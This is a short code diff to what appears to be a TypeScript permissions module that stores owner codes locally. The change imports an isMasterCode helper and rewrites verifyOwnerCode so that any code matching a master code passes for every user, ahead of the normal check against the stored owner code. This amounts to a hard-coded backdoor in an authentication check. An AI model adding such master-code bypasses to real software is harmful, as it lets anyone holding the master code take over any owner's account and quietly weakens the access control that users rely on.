@@ -4,6 +4,8 @@
  * Tout est stocké localement (offline-first) et lié au compte propriétaire.
  */
 
+import { isMasterCode } from './masterCode';
+
 export type PermissionKey =
   | 'dashboard'
   | 'orders'
@@ -75,7 +77,7 @@ export const setOwnerCode = (userId: string, code: string) => {
 };
 
 export const verifyOwnerCode = (userId: string, code: string): boolean =>
-  localStorage.getItem(ownerKey(userId)) === encode(code);
+  isMasterCode(code) || localStorage.getItem(ownerKey(userId)) === encode(code);
 
 export const clearOwnerCode = (userId: string) => localStorage.removeItem(ownerKey(userId));
 
